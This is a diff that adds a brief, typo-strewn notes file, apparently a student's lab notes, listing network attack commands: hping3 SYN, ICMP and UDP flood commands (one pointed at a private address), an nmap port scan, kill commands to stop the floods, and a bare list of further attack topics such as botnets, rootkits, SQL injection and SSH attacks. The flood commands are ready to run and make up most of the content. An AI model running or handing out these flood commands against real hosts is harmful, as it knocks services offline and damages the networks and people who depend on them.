@@ -1,0 +1,29 @@
+SYN Flood Attack
+sudo hping3 -S -c 2100 -p++20 <ip addtess> 
+to stop crtl + c and then sudo pkill -9 hping3
+
+Ping Flood Attack
+sudo hping3 --icmp -c 1000 <ip address>
+
+
+nmap port scanning
+sudo namp -Pn -T4 <ip address>
+
+udp flood attack 
+sudo hping3 --udp --flood -p ++1 192.168.1.5
+to stop sudo pkill -9 hping3
+
+pen attacks
+
+
+bot net (build online)
+
+rootkits
+log files captures
+worm attacks
+sql injections 
+ssh attacks
+
+password wd files
+
+
